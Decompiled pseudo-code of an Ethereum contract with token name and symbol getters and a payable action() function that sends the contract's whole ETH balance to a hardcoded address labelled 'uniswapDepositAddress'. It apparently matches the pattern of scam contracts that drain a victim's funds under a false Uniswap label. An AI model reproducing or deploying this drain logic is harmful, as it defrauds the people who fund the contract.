contract main {




// =====================  Runtime code  =====================


const uniswapDepositAddress = 0x8202ce19640e39b7d972f4338798bbe8abbe5281


array of uint256 tokenName;
array of uint256 tokenSymbol;

function tokenName() {
    return tokenName[0 len tokenName.length]
}

function tokenSymbol() {
    return tokenSymbol[0 len tokenSymbol.length]
}

function _fallback() payable {
    revert
}

function action() payable {
    call 0x8202ce19640e39b7d972f4338798bbe8abbe5281 with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}



}
